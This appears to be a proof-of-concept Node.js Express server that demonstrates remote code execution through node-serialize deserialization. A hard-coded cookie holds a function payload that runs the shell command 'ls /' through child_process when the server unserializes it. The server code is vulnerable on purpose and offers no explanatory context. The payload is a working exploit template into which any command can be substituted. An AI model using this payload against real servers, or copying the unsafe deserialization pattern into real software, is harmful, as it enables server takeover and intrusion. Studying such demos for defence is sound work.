var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser());
let fakeCookieWeSend = JSON.stringify({"rce":"_$$ND_FUNC$$_function(){        require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });    }"});
app.get('/', function(req, res) {
    // let profile = req.cookies.profile;
    let profile = fakeCookieWeSend;
    if (profile) {
        var str = Buffer.from(profile).toString();
        var obj = serialize.unserialize(str);
        if (obj.username) {
            res.send("Hello " + escape(obj.username));
        }
    } else {
        res.cookie(
            'profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", 
            { maxAge: 900000, httpOnly: true}
        );
    }
    res.send("Hello World");
});
app.listen(3000);
console.log('Listening on 3000');